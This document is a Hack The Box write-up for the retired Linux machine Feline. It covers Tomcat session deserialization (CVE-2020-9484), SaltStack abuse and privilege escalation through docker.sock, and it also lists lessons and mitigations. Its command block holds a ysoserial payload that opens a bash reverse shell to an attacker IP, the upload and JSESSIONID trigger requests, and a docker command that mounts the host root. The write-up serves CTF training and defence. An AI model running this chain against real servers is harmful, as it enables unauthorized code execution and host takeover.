---
machine: Feline
os: Linux
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [linux, tomcat, deserialization, saltstack, docker-socket]
---

# Feline — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **Status:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

Tomcat is vulnerable to CVE-2020-9484: a Java session uploaded to the server is loaded through `JSESSIONID` and executes code. A compromised SaltStack and an exposed `docker.sock` allow mounting the host and reaching root.

## Reconnaissance

```bash
nmap -Pn -sCV -p22,80,443,8000,8080 <IP>
curl -s http://feline.htb:8080/ | head
# CVE-2020-9484
ysoserial.jar CommonsCollections6 "bash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1'" > session.ser
curl -X PUT --data-binary @session.ser http://feline.htb:8080/upload/session.ser
curl -H "Cookie: JSESSIONID=../../upload/session" http://feline.htb:8080/
# Docker
ls -la /var/run/docker.sock
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host
```

## Enumeration

- Tomcat with `PersistentManager` and on-disk sessions.
- SaltStack with an accessible API and reused credentials.
- Docker socket mounted in a container.

## Initial access

Upload a serialized session file generated with `ysoserial` and send a `JSESSIONID` pointing to it. Tomcat deserializes the session and runs the gadget, yielding a shell as the Tomcat user.

## Privilege escalation

Use SaltStack to execute in its container. The mounted `docker.sock` allows creating a container with the host `/` mounted and executing as root outside the isolation.

## Evidence

- Serialized session and `JSESSIONID` callback.
- Salt API executing commands.
- `docker.sock` and a container with the host filesystem.

## Lessons learned

- Tomcat persistent sessions are deserialization of untrusted data.
- A Docker socket is equivalent to host root.
- SaltStack credentials may be reused.

## Mitigation and detection

- Update Tomcat and do not persist sessions in writable paths.
- Restrict the Salt API and rotate credentials.
- Do not mount `docker.sock` into containers.

## References

- [0xdf — Feline](https://0xdf.gitlab.io/2021/02/20/htb-feline.html)
- [NVD — CVE-2020-9484](https://nvd.nist.gov/vuln/detail/CVE-2020-9484)
- [Hack The Box — Feline](https://app.hackthebox.com/machines/feline)
